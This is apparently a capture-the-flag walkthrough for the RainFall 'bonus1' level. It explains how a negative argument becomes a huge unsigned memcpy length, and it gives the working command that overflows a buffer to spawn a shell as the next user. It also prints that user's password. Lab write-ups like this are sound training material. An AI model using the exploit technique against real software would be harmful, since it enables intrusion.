# Bonus1 Walkthrough

## Analyzing the Program with GDB or Ghidra

1. **Disassemble the program functions**:
    We can see some functions and variables: 
    - `atoi` function : ...
    - `len` variable : has to be strictly less than 10 

    Without arg, it segfault but with gdb we can see that the program use memcpy() so it is vulnerable to buffer overflow.

    - first arg : is convert into an `int` 
    - second arg : is a string copied in a buffer located 40bytes above the address where the value of atoi() is stored.

    if the value of atoi is < 9 then the prgm call memcpy() to copy a part of the second arg into the buffer

    next, the value of atoi is compared to 0x574f4c46 which is 'FLOW'

## Running the program

1. **Calculating**
    - here, we'll have to understand signed integer in 32bits. 
    - memcpy will copy 4 * value of atoi, we'll have to find a negative value who, while multiplied by 4 can access to the memory above the buffer and overwrite the value of atoi, and then replace the value of atoi by FLOW.
    - -2147483630

    - memcpy take an unsigned integer, so it'll be positive directly. 
        - signed : `0` for positive number and `1` for negative number in binary
        - unsigned : every bits is use to represent every positive value.
    
    - Here, the compiler does an implicit conversion of types, if the `signed int` is negative, his bits are unchanged for the other type. 
    Example: `-1` in binary is : `11111111 11111111 11111111 11111111` if this is interpreted with an unsigned it will be `11111111 11111111 11111111 11111111 = 4294967295`

2. **Trying to overflow the RET value**

    "\x46\x4c\x4f\x57" = FLOW en little-endian

    ou `./bonus1 -2147483637 $(python -c "print 'A' * 40 + 'FLOW'")`

    ```bash
    bonus1@RainFall:~$ ./bonus1 -2147483630 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
    $ whoami
    bonus2
    $ cat /home/user/bonus2/.pass
    579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
    $ ^C
    $ exit
    bonus1@RainFall:~$ su bonus2
    Password: 
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
    bonus2@RainFall:~$ 
    ```

## Moving to bonus2

1. **Swith User to bonus2**:
    Run ```su bonus2```

2. **Authenticate with the Password**:
    We used the password we found.